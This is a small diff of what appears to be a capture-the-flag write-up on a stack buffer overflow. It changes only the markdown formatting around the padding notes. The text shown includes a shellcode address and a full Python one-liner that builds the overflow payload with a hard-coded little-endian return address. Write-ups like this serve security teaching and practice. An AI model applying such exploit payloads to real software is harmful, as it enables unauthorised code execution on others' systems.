@@ -21,8 +21,8 @@ int main(int argc, char **argv) {
 ```
 `./a.out SHELLCODE` -> `0xbffff916`
 
-input1 = i*20 (20 bytes so it doesn't end with \0)
-input2 = i*9 + shellcode address + i*7
+input1 = `i*20` (20 bytes so it doesn't end with \0)
+input2 = `i*9` + shellcode address + `i*7`
 
 full payload:
 `python -c "print 'i'*4095 + '\n' + 'i'*9 + '\x16\xf9\xff\xbf' + 'i'*70" > /tmp/a`
